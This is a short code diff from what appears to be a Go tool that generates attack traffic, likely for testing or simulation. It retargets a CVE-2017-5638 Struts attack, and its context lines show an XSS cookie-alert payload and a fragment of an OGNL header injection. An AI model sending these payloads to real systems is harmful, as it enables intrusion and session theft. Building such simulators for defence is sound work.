@@ -120,7 +120,7 @@ func (p *program) Start(s service.Service) error {
 	xssBlast = Attack{name: "XSS Blast", method: "GET", maxNap: 7000, minNap: 1, maxRequests: 1200, pause: 1,
 		minRequests: 100, url: fmt.Sprintf("http://%s/forum/memberlist.php?account=%s", target, "%5C%22%3E%5C%22%3Cscript%3Ejavascript%3Aalert%28document.cookie%29%3C%2Fscript%3E")}
 	cve20175638 = Attack{name: "cve20175638", method: "GET", maxNap: 600, minNap: 1,
-		url:     fmt.Sprintf("http://%s/uploads", target),
+		url:     fmt.Sprintf("http://%s/", target),
 			     headers: map[string]string{"Content-Type": "%{(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?)multipart/form-data"}}
 
 	/* Attack Tools */
